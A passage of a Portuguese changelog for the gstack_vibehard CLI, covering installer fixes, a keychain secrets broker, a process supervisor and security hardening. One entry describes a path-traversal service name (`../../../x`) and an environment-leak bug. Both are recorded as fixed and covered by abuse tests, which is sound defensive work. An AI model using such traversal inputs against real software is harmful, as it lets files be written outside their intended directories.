- **Novo comando `gstack_vibehard agents <build|check|diff|doctor|list|explain>`** — `doctor` mostra manifest v2, drift, contrato N/N, security e a **matriz de adapters × confiança real** (capabilities.js); nenhum harness instrucional rotulado enforcement.
- **dream audit** ganha `agent-factory` = **REAL** → **9 REAL / 3 PARTIAL / 0 PLACEBO / 0 ROADMAP / 1 RISK**.
- **+4 testes** de factory (contrato idempotente, hashFiles determinístico, manifest v2, `evaluateDrift` de abuso) + asserts de manifest v2/contrato/**drift on edit** no build e2e. Adapters regenerados (21 agentes). **347 Node** + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.10.1] - 2026-06-26

### Correções pós-reconfirmação na máquina Windows limpa
- **`secrets run` falhava no bin global do Windows** ("Uso: secrets run --"): o shim `.cmd` do npm **engole o `--`**, então o separador não chegava ao comando. Agora o `--` é **opcional** — `secrets run node x.js` vale igual a `secrets run -- node x.js` (pega tudo após `run`, ou após o `--` se houver; comando preservado verbatim). **+1 teste** (`parseRunArgs` com e sem `--`).
- **`install --help` não listava `--allow-degraded`**: o flag funcionava mas não era descobrível. Adicionado ao usage. 343 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.10.0] - 2026-06-26

### Truth-sync: o `dream audit` agora conhece o sprint entregue (PRD 12 PR1)
Reconcilia as promessas com a realidade — o auditor anti-placebo passou a listar o que o sprint PRD 12 entregou.
- **`dream audit` ganha 5 claims REAIS** com evidência verificada no código: **runtime-supervisor** (`dev`/`stop`), **secrets-broker** (keychain, sem `.env`), **runtime-manifest** (V2), **package-manager** (`doctor --package-manager`) e **full-contract** (`--allow-degraded`). Resultado: **8 REAL / 3 PARTIAL / 0 PLACEBO / 0 ROADMAP / 1 RISK** (Output Guard segue RISK honesto — auditoria pós-resposta, sem intercept pré-render).
- **README:** corrige a claim **factualmente errada** "ECC2" → **ECC** (`ecc-universal`; ECC2 era vaporware/404 que auditamos) e aponta segredos para o **broker** (keychain), não `.env` em claro.
- **+5 asserts** no teste do audit travam os novos claims como REAL. 342 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.9.0] - 2026-06-26

### Contrato Full sem degradação silenciosa (PRD 12 §11, P1-#7)
"Full = tudo" não termina mais como **concluído** se um componente do completo falhou em silêncio.
- **Novo `src/installer/full-contract.js`** (puro/testável): `trackDegraded(report, comp, reason)` (dedup por componente) + `evaluateFullContract({degraded, projectOnly, auditOnly, skipDeps, allowDegraded})` → `{block, isFull, message}`. Regra: no modo **Full**, qualquer componente degradado **BLOQUEIA** (exit 1); Lite/project-only/audit-only **toleram** (só avisam).
- **`install` rastreia o degradado** em vez de só `warn`-and-continue: **gbrain, graphify, ECC, headroom** (binário ausente após instalar) e **Obsidian app**. No fim, imprime "Contrato Full — componentes degradados" e **bloqueia** sem `--allow-degraded`.
- **Novo flag `--allow-degraded`**: aceita explicitamente o estado parcial (Full prossegue, marcado como DEGRADADO). Sem ele, o install sai com erro e remediação clara.
- Não afeta `--audit-only`/`--project-only` (retornam antes do gate / são tolerados). **+5 testes** (bloqueia/allow/ok/Lite tolera/dedup). 342 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.8.0] - 2026-06-26

### Secrets Broker real — keychain do SO, sem `.env` (PRD 12 §10, P0-B)
Sai do "lista de nomes" para um broker de verdade: o **valor** vive no keychain do SO e é injetado **só em memória** no serviço; o repo nunca vê segredo em claro.
- **Providers por SO** (`src/secrets/providers.js`): **Windows DPAPI** (cifra com a chave do usuário, externa ao arquivo — via PowerShell `ConvertFrom/ConvertTo-SecureString`), **macOS Keychain** (`security`), **Linux libsecret** (`secret-tool`). Valor sempre por **STDIN**, nunca em argv (não vaza na lista de processos). Detecção por sonda benigna (não `--version`).
- **Schema v2** (`src/secrets/schema.js`): `{schemaVersion:2, provider, required:[{name,scope,services,sensitive}], optional}`. Migra o v1 (lista de nomes) automaticamente. `create` agora gera o v2; `required[].services` = allowlist de quem recebe cada segredo.
- **Broker** (`src/secrets/broker.js`): namespace por projeto (hash do path), índice de **nomes/metadados** (`names.json`, **nunca valores**), resolução em memória, `redact()` p/ logs, `parseDotEnv` p/ import.
- **`gstack_vibehard secrets <doctor|list|set|delete|import|run>`**: `set` sem echo (ou `--stdin`); `list` **nunca** mostra valor; `import .env` guarda no keychain e oferece renomear o `.env`; `run -- <cmd>` injeta só os requeridos em memória.
- **`dev` consome o broker**: resolve os `secretRefs` declarados do keychain (precedência sobre o shell; fallback honesto sem broker) e injeta só ao serviço dono.
- **`.env` NÃO é mais exposto ao Atomic** (`workspace.toml`) e o template/README passa a orientar `secrets`, não `cp .env.example .env`.
- **+5 testes** (migração v1→v2, parseDotEnv, broker com provider fake, índice sem valor, resolve só declarados, redação). 337 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.7.3] - 2026-06-25

### Correção: manifest/config com BOM era ignorado em silêncio no Windows (PRD 12 PR4)
Reconfirmação numa máquina Windows limpa expôs: `gstack_vibehard dev` dizia "Sem manifest de runtime" mesmo com o `.gstack/runtime.json` presente.
- **Causa real:** o PowerShell 5.1 (`Set-Content -Encoding utf8`) e vários editores no Windows gravam UTF-8 **com BOM** (EF BB BF). Os leitores faziam `JSON.parse(readFileSync(...))` sem remover o BOM → `JSON.parse` lançava no `﻿` inicial → o `catch` engolia → o arquivo era tratado como **ausente/ilegível** em silêncio.
- **Fix de raiz:** novo `src/util/json.js` com `stripBom`/`readJsonFile` (no-op em arquivo limpo — seguro). Aplicado nos leitores dos arquivos que o usuário edita à mão: **runtime manifest** (`runtime.json`/`services.json`), state do supervisor, **resolver de package manager** (`package.json`/`app.json`) e **project-plan** (`state`, `detect-profile`, `verify-runner`).
- **+2 testes** (stripBom no-op/início; `loadRuntimeManifest` lê manifest COM BOM). 332 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.7.2] - 2026-06-25

### Endurecimento do Runtime Supervisor — 2 P0 de segurança + 4 P1 (PRD 12 PR4)
Auditoria externa pegou abusos que o smoke/CI de *funcionalidade* não cobriam. Reproduzi os 6, corrigi e blindei com testes de **abuso** (não só de feature).
- **[P0] Vazamento de `process.env`** — `dev` passava `{...process.env}` ao serviço e gravava `{...s}` (com env) no state. Agora o serviço só recebe **base OS-essencial + porta + segredos DECLARADOS em `secretRefs`** (allowlist), e o state file é gravado por **whitelist de campos** (`pickState`) — **env/segredo nunca vão a disco**. Reproduzido vazando `GSTACK_FAKE_SECRET` antes; sumiu depois.
- **[P0] Path traversal pelo nome do serviço** — nome `../../../x` escrevia fora de `.gstack/runtime`. Agora `validateRuntimeManifest` **rejeita** nome fora de `[A-Za-z0-9._-]`/com `..` (1ª defesa: `dev` para antes do disco) e `writeServiceState` valida nome + **contém o caminho** no runtime dir (`assertWithin`, defesa em profundidade).
- **[P1] Spawn de binário inexistente derrubava o CLI** — `Unhandled 'error' event` + exit 1. Agora o `dev` aguarda o desfecho do spawn (`'spawn'` vs `'error'`) de forma determinística → serviço vira `status: failed` honesto, **sem crash**.
- **[P1] `dev` duplicado orfanava processos** — `clearState()` rodava antes de checar execução viva. Agora o `dev` **recusa** se já há runtime vivo (`isAlive` via signal 0); `--force` reinicia parando o antigo primeiro.
- **[P1] `stop` não validava dono do PID** — pid reusado/state adulterado podia matar processo alheio. Agora valida a **idade real do processo** (tz-free: `Get-Process`/`ps -o etimes=`) vs a registrada → foreign é **pulado** (`skipped-foreign`), não morto. Fallback honesto quando não dá pra ler.
- **[P1] readiness aceitava 4xx como saudável** — `pollReadiness` agora só **2xx/3xx** = pronto; 4xx/5xx = `unhealthy`.
- **+15 testes de abuso** (env-allowlist, state-whitelist, traversal rejeitado, dono-do-PID, isAlive, readiness 4xx, spawn-no-crash e2e, dev-idempotente e2e). 330 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.7.1] - 2026-06-25

### Correção: `stop` vazava processo no Linux (PRD 12 PR4 — pego pelo CI)
O CI (ubuntu) pegou o que o smoke no Windows não podia: o `stop` da v3.7.0 **não matava** os serviços no Linux.
- **Causa real:** no POSIX o `stop` rodava `kill -TERM -<pid>` via **binário**; o `kill` do **util-linux** (Linux) **sai 0 sem matar** quando recebe `-<pid>` como grupo (só o `kill` BSD do macOS aceitava). Resultado: `stop` reportava "stopped" mas o processo seguia de pé.
- **Fix:** no POSIX o `stop` agora usa o primitivo **nativo** `process.kill(-pid, "SIGTERM")` (syscall direta no **grupo** de processos — o `dev` sobe `detached`, então o pid é líder do grupo). Sem dependência do binário `kill`. Windows segue com `taskkill /T /F` (árvore). **O `exec` só é injetado no Windows.**
- **Teste e2e robusto:** lê a porta/status **reais** do state (`.gstack/runtime/web.json`) em vez de assumir a `preferred` (que colide no CI). **+1 unit** do caminho POSIX nativo (mata o grupo via `-pid`, nunca o binário).
- Sem mudança no shipado fora do `stop`/teste. 321 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.7.0] - 2026-06-24

### Runtime Supervisor — `dev`/`stop`/`logs`/`open` (PRD 12 PR4 — o motor)
Sobe e derruba os serviços do projeto a partir do Runtime Manifest V2 (PR3). Sem shell, sem race de porta, mata a **árvore** de processos.
- **Novo `src/runtime/ports.js`:** `isPortFree`/`allocatePort` por **bind real** em `127.0.0.1` (sem race — quem aloca já segurou a porta); injetável para teste.
- **Novo `src/runtime/supervisor.js`:** lógica **pura/injetável** — `planStart` (manifest → plano de spawn com **argv** e env de porta, **sem shell**), `killTreeCommand` (Windows `taskkill /T /F`; POSIX `kill -TERM -<grupo>`), `stopAll` idempotente, `pollReadiness` HTTP, state por serviço em `.gstack/runtime/`.
- **`gstack_vibehard dev [--open] [--json]`:** sobe cada serviço **detached** (sobrevive ao launcher), redireciona stdout/stderr para `.gstack/runtime/logs/<svc>.log` (fd numérico — não WriteStream), aloca porta, aguarda readiness e marca `ready`/`unhealthy` honestamente.
- **`stop`** encerra a árvore e limpa o state (idempotente); **`logs [svc]`** mostra o log; **`open`** abre o preview web.
- **`.gstack/runtime/`** entra no `.gitignore` do template (state local, não versionado).
- **+9 testes** (8 unit de ports/plan/kill/stop/readiness/state + **1 e2e real**: sobe um http server de verdade, prova que sobrevive ao `dev` e que o `stop` mata). 320 Node + 58 Python verdes; lint/syntaxcheck limpos; pack smoke OK.

## [3.6.0] - 2026-06-24

### Runtime Manifest V2 + `runtime status` (PRD 12 PR3 — fundação do supervisor)
Evolui os manifests que o `create` já gera (não cria formato concorrente) para o contrato que o supervisor (`dev`, PR4) vai consumir.
- **Novo `src/runtime/manifest.js`:** `buildRuntimeManifest`/`migrateServiceToV2`/`validateRuntimeManifest`/`loadRuntimeManifest`. Schema **v2**: `command` sempre em **array** (sem shell string), `port.autoAllocate`, `health.readiness`+`liveness`, `restart` com circuit breaker, `dependsOn`, `secretRefs`. Migra o v1 (`services.json`) automaticamente.
- **`create` grava `.gstack/runtime.json`** (v2) junto dos manifests existentes.
- **Novo `gstack_vibehard runtime status [--json]`:** lê e **valida** o manifest declarado (o que o `dev` vai subir), com checagem honesta (`válido`/`INVÁLIDO`). `dev/stop/logs/open` respondem `pending_feature` até o PR4 (supervisor).
- **Sem motor ainda** (supervisão de processo é o PR4). **+5 testes** (tokenize/migração/build/validação/load). 311 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.5.0] - 2026-06-24

### `doctor --package-manager` — resolver único de npm/pnpm (PRD 12, sprint 1)
Primeiro PR do PRD 12 (PR2). Resolve a dor real que vivemos nesta jornada (corepack `EPERM`, pnpm ausente, `node_modules` pnpm com `package-lock` npm).
- **Novo resolver** (`src/installer/package-manager.js`): detecta o PM por prioridade — `packageManager` do package.json → lockfile versionado → `.gstack/app.json` → layout de `node_modules` → fallback npm. Retorna **estado honesto**: `ok | missing_binary | lockfile_conflict | node_modules_mismatch`, com reparo seguro por estado.
- **`gstack_vibehard doctor --package-manager` (`--pm`)**: reporta o estado; `--json`/`--strict` p/ automação. **`--fix`** instala o **pnpm ausente** via `npm install -g pnpm` (com confirmação; `corepack` precisa de admin no Windows). **Nunca apaga lockfile/node_modules automaticamente** — conflito/mismatch exigem confirmação manual.
- Já flagra o mismatch do próprio repo (`package-lock.json` + `node_modules/.pnpm`).
- **+6 testes** (todos os estados do resolver, io injetado). 306 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.4.2] - 2026-06-24

### Correção honesta do encoding no pipe (o fix do v3.4.1 não funcionava)
- **[honestidade] o `chcp` no pipe do v3.4.1 NÃO consertava o mojibake** e foi revertido para só-TTY. Motivo real (validado na máquina): o PowerShell **cacheia `[Console]::OutputEncoding` no startup** (codepage OEM) e um `chcp` rodado por **subprocesso** não muda esse cache — então `gstack ... | Select-String` continua distorcendo. O **render DIRETO** (uso normal) está **perfeito** (confirmado: banner e `✓` legíveis). Para pipe, o usuário roda uma vez na sessão: `[Console]::OutputEncoding=[System.Text.Encoding]::UTF8`.
- **[confirmado] `install --yes` instala o ECC com segurança** — o `postinstall` do `ecc-universal` é apenas um `echo` (não auto-injeta skills no `~/.claude`); o `ecc` é um CLI **instalador** (sem `--version`), consumido on-demand. Alinha com o contrato b+c (gstack dono do namespace, ECC como biblioteca).
- Sem mudança de teste (revert + doc honesta). 300 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.4.1] - 2026-06-24

### Polimento pós-validação na máquina real (encoding no pipe + ECC no install)
- **[encoding] `chcp 65001` agora roda MESMO quando a saída é canalizada** (`gstack ... | Select-String`): antes pulava se não-TTY, e o PowerShell relia a saída nativa como OEM → mojibake no pipe. A codepage é do console (compartilhado), então trocá-la conserta também o pipe. Render direto já estava legível (confirmado na máquina); agora o pipe também.
- **[Full = tudo] `install --yes` instala o ECC global** (`ecc-universal`, binário `ecc`) — antes só o `create --full` o instalava, deixando `ecc` ausente após um `install` puro. Consistente com gbrain/graphify/headroom; pula se já presente.
- **+1 teste de guarda** (install instala ecc-universal). 300 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.4.0] - 2026-06-23

### `/start` como ponto de entrada guiado (PRD 11 Fase 4 — fecha o roadmap)
- **Nova skill `/start`** (`skills/skills/start/SKILL.md`, `trigger: /start`): a porta de entrada do gstack — objetivo → plano → execução, mapeando para `gstack_vibehard start`. O usuário comum não precisa decorar a CLI.
- **`/start` surfaçado PRIMEIRO** no guidance de cada harness (Claude, Codex, OpenCode) — antes de `/newproject`, com o rótulo "PONTO DE ENTRADA — use primeiro". No completo, `/start` oferece a instalação completa; no lite, explica o caminho enxuto.
- **+2 testes** (skill /start com trigger; ordenado antes de /newproject nos 3 harnesses). 299 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.3.2] - 2026-06-23

### Output legível no PowerShell legado (fim do mojibake) — PRD 11 Fase 4 (P2)
- **No Windows TTY, o gstack troca a codepage do console para UTF-8 (`chcp 65001`) no startup** — conserta de uma vez TODO o output (banner `╔══╗`, `✓`, `—`, …) que aparecia como mojibake (`ÔòöÔòÉ`, `Ô£ô`) no Windows PowerShell 5.1. Só em TTY, ignora erros, pula terminais que já são UTF-8 (Windows Terminal/VSCode).
- **Fallback ASCII:** se a codepage não puder ser trocada (ou via `--ascii`/`GSTACK_ASCII=1`), o banner usa moldura ASCII (`+---+`/`|`/`-`) em vez de box-drawing — sem depender de UTF-8.
- **+1 teste** (banner ASCII sem box-drawing). 297 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.3.1] - 2026-06-23

### MCP global + app Obsidian no modo completo (PRD 11 Fase 3 parte 2 — "Full = tudo")
- **[P0] MCP global agora é escrito no completo** (`install.js`): antes era opt-in (`--global-mcp`); agora o `install --yes` escreve os MCP servers do gstack em `~/.mcp.json` por padrão (alinha o preflight, que já declarava o Headroom escrevendo lá). **Opt-out: `--no-global-mcp`.** `project-only`/lite **nunca** escrevem.
- **App Obsidian no completo:** quando não detectado, o Full **tenta instalar o app** (`winget install Obsidian.Obsidian` no Windows / `brew install --cask obsidian` no mac) — reportado honesto, **degraded** se não houver winget/admin/cask (o vault em `~/gstack-vault` é markdown e abre em qualquer editor). **Opt-out: `--no-obsidian`.**
- **+2 testes de guarda** (MCP opt-out; Obsidian winget + opt-out). 296 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.3.0] - 2026-06-23

### Status honesto por componente no `create --full` (sem ✓ falso)
PRD 11 Fase 3 (parte 1): o Full deixa de dizer "✓ configurado" para componentes que **não instalaram** na máquina.
- **`bootEcc2`/`initAtomic`/`bootAgentMemory` retornam status real** (`installed | degraded | skipped`) em vez de void; `startCasdoor` vira `online | degraded`. O `create --full` imprime um resumo **"Componentes do Full (status real nesta máquina)"** com ✓/⚠ por item — se faltou Docker (Casdoor) ou Rust (Atomic), aparece **`degraded`** com o reparo, não um check falso. Removido o phantom `phases.daemons: "configured"`.
- **Honestidade:** Git e o projeto seguem funcionais mesmo com componentes degraded; o Full não mente que subiu tudo.
- **+1 teste** (phases com status real; sem "daemons configured" falso). 294 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.2.1] - 2026-06-23

### ECC como biblioteca on-demand (decisão b+c) + AgentShield no `verify`
Decisão de produto: o gstack é **dono** do seu namespace (skills/hooks/agentes em `gstack-vibehard/`) e consome o ECC como **biblioteca on-demand** — **sem** injetar o perfil do ECC (evita clobber das 261 skills do ECC sobre as do gstack).
- **`create --full`** reenquadra a mensagem do ECC: instala o pacote `ecc-universal` (binário `ecc`) e **não** roda `ecc-install --profile full` automático; surfaça as capacidades on-demand (`ecc`, `npx ecc-agentshield scan`). Confirmado que `ecc-universal@2.0.0` expõe os bins `ecc`/`ecc-install`/`ecc-control-pane` e que `ecc-agentshield@1.4.0` é pacote npm real.
- **Novo `verify --agentshield`** (ou `GSTACK_AGENTSHIELD=1`): roda o **ECC AgentShield** (scan de prompt-injection) no `CLAUDE.md`/`AGENTS.md` como camada **advisory e não-bloqueante** — gstack consumindo o ECC como biblioteca, com skip gracioso se indisponível (não vira dependência dura do gate).
- **+3 testes** (AgentShield advisory / falha-não-bloqueia / opt-in). 293 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.2.0] - 2026-06-23

### 🧭 Alinhamento do ECC e do Atomic VCS à realidade (fim do "ecosystem drift")
A auditoria das fontes provou que dois componentes do modo completo estavam apontando para **vaporware** (repos/domínios que não existem). Fontes reais (passadas pelo dono) integradas:
- **[fix] ECC** — o `bootEcc2` (`create.js`) clonava `github.com/gstack-dev/ecc2` (**404**) e compilava um daemon Rust via cargo — dependência fantasma que travava o `create --full`. O ECC real é o pacote npm **`ecc-universal@2.0.0`** (otimizador de performance de harness: agents/skills/hooks/AgentShield; binário `ecc`); o daemon `ecc2` é só protótipo alfa in-tree. Agora instala via `npm i -g ecc-universal` (pula se `ecc` já existe); perfil completo opcional via `npx ecc-install --profile full`.
- **[fix] Atomic VCS** — o `initAtomic` baixava de `atomic-vcs.dev` (**domínio morto, não resolve**). Fonte real: **`github.com/atomicdotdev/atomic`** (Rust) → `git clone` + `cargo install --path atomic-cli` (usa o Rust que o gstack já instala). Removido `atomic-vcs.dev` da allowlist de downloads.
- **[fix] `monitor`** não depende mais de `ecc2 daemon status` (binário fantasma) p/ o orçamento de tokens — usa `GSTACK_TOKEN_BUDGET`/default, sem chamar daemon inexistente.
- **Coerência:** `app.json` `controlPlane` vira `ecc-universal`; AGENTS.md e o script de dev deixam de prometer "ECC 2.0 Daemon (dashboard/sessions)" → "Harness Optimizer: ECC". **Lite intocado.**
- **+2 testes de guarda** (ECC=ecc-universal sem gstack-dev/ecc2; Atomic=atomicdotdev/atomic sem atomic-vcs.dev). 290 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.1.5] - 2026-06-23

### graphify instala global (token-saver) + fim do pacote fantasma cli-anything-hub
- **[fix] graphify agora INSTALA de verdade, global** (`install.js`): o pacote PyPI é **`graphifyy`** (dois "y"; o CLI continua `graphify`) — por isso `uv tool install graphify` dava **E404**. Agora `uv tool install graphifyy` instala o indexador AST por commit pra **qualquer projeto** (economiza muito token: a IA lê a topologia do código sem gastar contexto). Pula se já presente; honesto se uv faltar. Fonte: `github.com/safishamsi/graphify`.
- **[fix] removido o pacote fantasma `cli-anything-hub`** — `npm install -g cli-anything-hub` dava **E404** porque o pacote **nunca existiu**. O recurso real é o **Printing Press** (gerador de CLIs em Go), que o gstack já integra via `gstack_vibehard tools` (catálogo `@mvanhorn/printing-press-library` → compila `cli-printing-press` sob demanda). Sem mais 404 no install; o install aponta o caminho real.
- **+2 testes** (guarda de regressão dos nomes: `graphifyy` ✓, sem `cli-anything-hub`). 288 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.1.4] - 2026-06-23

### Robustez/honestidade do install no Windows (PRD 11 — Fase 1)
- **[P0] template `postinstall` quebrava o `pnpm install` no Windows** — era `fallow coverage setup … || true`, mas `|| true` é shell Unix (o `true` não existe no `cmd.exe`) → `ELIFECYCLE exit 1`. Agora é `node scripts/postinstall-fallow.mjs` (cross-platform): roda o fallow **se existir** e **sempre sai com exit 0** (opcional, nunca falha o install do projeto).
- **[P1] `install --yes` não pergunta mais o harness** — antes, num PowerShell interativo o prompt "Instalar em quais harnesses?" aparecia mesmo com `--yes`. Agora `--yes` (modo completo) seleciona **todos os detectados** sem prompt; para subconjunto, `--harness <id>`.
- **[P0] preflight de MCP coerente** — o preflight dizia "MCP global: NÃO será escrito" enquanto o Headroom configura `~/.mcp.json`. Agora é honesto: no completo declara **"Headroom configura `~/.mcp.json`"** + estado dos MCP servers do gateway (`--global-mcp`); em `project-only`, nada.
- **+2 testes** (postinstall: referenciado sem `|| true` e sempre exit 0). 286 Node + 58 Python verdes; lint/syntaxcheck limpos; heavy smoke (pnpm install + turbo build) OK.

## [3.1.3] - 2026-06-23

### 🪟 `refreshPath` quebrava o `cmd.exe` no meio do install (root cause do ENOENT)
- **[fix] causa-raiz:** `refreshPath()` (`install.js`) **substituía** o `process.env.Path` pelos valores crus do registro — que guardam `%SystemRoot%\system32` **não-expandido** (REG_EXPAND_SZ). Resultado: depois dele, o PATH perdia o **System32**, e qualquer spawn de `cmd.exe` dava `spawnSync cmd.exe ENOENT` (foi o que sobrou no `cli-anything-hub`, que roda **depois** do `refreshPath`; o playwright passou porque roda antes). Agora `refreshPath` **expande `%VAR%` e MESCLA** com o PATH atual (novo `mergeWindowsPath`, dedup case-insensitive) — nunca perde o System32.
- **Blindagem extra:** `npmArgv`/`npxArgv` passam a usar o caminho **absoluto** do cmd.exe (`process.env.ComSpec`), robusto mesmo se algo mexer no PATH.
- **+1 teste** (`mergeWindowsPath` expande/mescla/dedup) e `npm/npxArgv`/printing-press atualizados p/ ComSpec. 284 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.1.2] - 2026-06-22

### 🪟 Robustez do `install` no Windows (3 falhas reais que o install do dono expôs)
- **[fix] `graphify` parava de dar erro espúrio** (`install.js`): o passo fazia `uv tool install graphify`, mas **graphify não é pacote PyPI** → falhava SEMPRE com `No solution found... no versions of graphify`. Agora **pula se o binário já existe** (`findWorkingBinary`) e, se não, dá mensagem honesta (opcional) — sem o erro de resolução confuso.
- **[fix] `npm`/`npx` no Windows davam `spawnSync ENOENT`** — `execFileSync("npm"/"npx", …)` sem `.cmd` não acha o binário no Windows. Novo helper `npmArgv` (espelha o `npxArgv`) e uso cross-platform (`cmd.exe /c npm`/`npx`) em: `cli-anything-hub` (`install.js`), `connectAgentMemory` e `installGraphifyGitHooks` (`agent-distribution.js`). Agora a skill `cli-anything-hub` e a distribuição AgentMemory **instalam no Windows**.
- **+1 teste** (`npmArgv` win/unix) e assertions de comando agora cross-platform via `npxArgv`. 283 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.1.1] - 2026-06-22

### 🏗️ O template fullstack agora COMPILA (turbo build verde) + CI o garante
- **[fix] o template `fullstack-monorepo` não compilava** com `turbo build` — um usuário que rodava `create` + build levava erro na cara. Endurecido até **`Tasks: 4 successful, 4 total`** (web + api + api-fastify + api-hono), verificado num scaffold limpo do zero. Correções:
  - **`packageManager: pnpm@10.33.0`** no root (turbo 2.x exige p/ resolver os workspaces).
  - **deps faltando declaradas:** `@radix-ui/react-slot`, `class-variance-authority`, `tailwindcss-animate` (web); `drizzle-orm` (api-hono).
  - **arquivos faltando:** `apps/web/src/vite-env.d.ts` (tipos de `import.meta.env`), `apps/api/src/openapi.ts` (era importado mas inexistente).
  - **imports errados:** `patterns/index.ts` (`../components/patterns/…` → `./…`), pattern→lib (`../../lib` → `../../../lib`), `index.css` (`./themes/…` → `./styles/themes/…`).
  - **tipos:** CORS do Hono (`|| false` → default localhost string), `eq(users.id, req.params.id as string)` (Express), `req.query as unknown as …` (ParsedQs), `FastifyError` no error handler, imports não usados em `schema.ts`.
- **CI agora roda o build PESADO** (`.github/workflows/test.yml` job `templates`): `corepack enable` + `GSTACK_TEMPLATE_INSTALL=1` → `pnpm install` + `turbo build` do fullstack lite, **bloqueante**. `scripts/test-templates.mjs` passou a usar **pnpm** (o PM real do monorepo), não npm.
- Sem mudança no runtime do instalador. 282 Node + 58 Python verdes; lint/syntaxcheck limpos; pack/template smoke OK.

## [3.1.0] - 2026-06-22

### `doctor --repair-manifest` — conserta manifest inseguro sem destruir backups
- **Novo `doctor --repair-manifest`** (`src/installer/repair-manifest.js`): repara/migra um manifest de instalação inseguro (o que deixava `safeToUninstall=false`) **sem precisar de uninstall/reinstall total**. Ações: **poda** entradas cujo arquivo rastreado sumiu (nada a desinstalar); **marca não-restaurável** a entrada cujo backup não existe mais (mantém a entrada — **NUNCA apaga backups do usuário**); **reporta** (sem tocar) config JSON inválido e drift; **normaliza** schema legado.
- **Seguro por padrão:** `--dry-run` (default) só mostra o **plano**, não escreve nada. `--yes` aplica — e antes faz **backup versionado do próprio manifest**. `--json` para automação; `--strict` sai ≠0 se há mutação pendente não aplicada.
- Reusa `checkInstallIntegrity`/`sha256` (`integrity.js`), `versionedBackup` (`safe-write.js`) e o manifest como fonte de verdade. Rodado na máquina real, já achou entradas mortas de runs antigas.
- **+3 testes** (dry-run não toca nada; apply poda/marca/preserva backups e melhora `safeToUninstall`; manifest ausente). 282 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.0.17] - 2026-06-22

### QG_VERSION sincronizado + gate de release (não publica QG stale)
- **[fix] `QG_VERSION` estava congelado em `"3.0.3"`** (`hooks/hooks/qg.py`) enquanto o package já estava em 3.0.16 → o `verify` reportava uma versão de Quality Gate **falsa**. Agora o `QG_VERSION` **espelha o `package.json`** e é sincronizado automaticamente.
- **Novo `scripts/sync-qg-version.mjs`** + hook de lifecycle `npm version`: todo bump reescreve a linha `QG_VERSION` (replace **ancorado de uma linha**, idempotente) e faz `git add` do qg.py. O humano nunca mais edita à mão. (O drift de **conteúdo** continua coberto pelo `qg_hash` do próprio qg.py.)
- **Gate HARD no `publish-guard`** (`src/project-plan/publish-guard.js`): novo check `qg-version` **bloqueia o release** se `qg.py` divergir do `package.json` (rede de segurança contra edição manual / falha do sync / merge torto). `not_applicable` se o qg.py não existir (outro repo).
- **+6 testes** (sync: reescreve/idempotente/erro-loud; gate: match/mismatch-HARD/not_applicable). Suítes Node+Python verdes; lint/syntaxcheck limpos.

## [3.0.16] - 2026-06-22

### 🔒 Correção de segurança: `.gitignore` gerado em runtime (`.env` fora do git)
- **[SEGURANÇA] `create` gera um `.gitignore` próprio** (`src/cli/create.js`, em `writeRuntimeFiles`): como o v3.0.15 passou a rodar `git init` automaticamente, o projeto nascia como repo git **sem `.gitignore`** → um `git add -A` estagiava `node_modules` e, pior, o **`.env` com secrets**. Causa-raiz: o **npm faz strip de qualquer arquivo `.gitignore`** do tarball publicado, então o `.gitignore` do template **nunca chegava ao usuário** (verificado: ausente nos 4 templates no pacote instalado). Agora o `.gitignore` é **gerado em runtime** (independe do strip), cobrindo **todos os templates e modos** (lite e full): ignora `node_modules`, `dist`/`build`/`.next`/`coverage`, `.turbo`/`.vercel`, **`.env` / `.env.*`** (mantendo `!.env.example`), `.gstack/*.local`. Validado fim-a-fim com `git add -A` real → `.env` **não** rastreado.
- **Removido o `.gitignore` morto do template** `fullstack-monorepo` (nunca era publicado — o npm o removia; causava divergência repo≠tarball). Fonte única agora é a geração em runtime.
- **[teste] `bootGit` com exec injetável (DI)**: o teste de `git init` voltou a ser **hermético** (`GSTACK_SKIP_SIDE_EFFECTS=1` + `gitExec` mockado) — não spawna mais git/graphify/headroom reais (corrige o teste não-determinístico do v3.0.15, que dependia de quais binários estavam no PATH).
- **+2 testes** (git init via DI; `.gitignore` protege `.env` em default **e** vertical). 273 Node + 58 Python verdes; lint/syntaxcheck limpos; pack/template smoke OK.

## [3.0.15] - 2026-06-22

### `create` lite nasce versionado (git) → graphify se instala sozinho
- **[melhoria] `create` (lite) agora roda `git init`** (`src/cli/create.js`, novo `bootGit`): o projeto lite nasce **versionado** — o VCS do lite já é o git (`app.json` `vcs: "git"`). O `git init` roda **antes** do `bootGraphify`, então o graphify instala os hooks de commit **sem precisar de `git init` manual**. Some a mensagem "`hook install` nao retornou — opcional". Padrão de scaffolders (create-react-app, Vite). Em **full** o VCS continua sendo o Atomic (sem `git init`).
- **Causa-raiz corrigida:** em lite o `projectDir` só era criado no scaffold (Fase 4), **depois** do `bootGraphify` — o graphify rodava sem repo/diretório e não retornava. Agora o diretório é garantido (`mkdirSync`) + `git init` antes do graphify.
- **Honesto e não-bloqueante:** se o git não estiver instalado, mensagem clara e o `create` segue sem versionamento (idempotente — pula se já houver `.git`).
- +1 teste Node (lite roda `git init` → `.git` existe + `app.json vcs:"git"`). 272 Node + 58 Python verdes; lint/syntaxcheck limpos.

## [3.0.14] - 2026-06-20

### Reinstalação e atualização limpas na mesma máquina
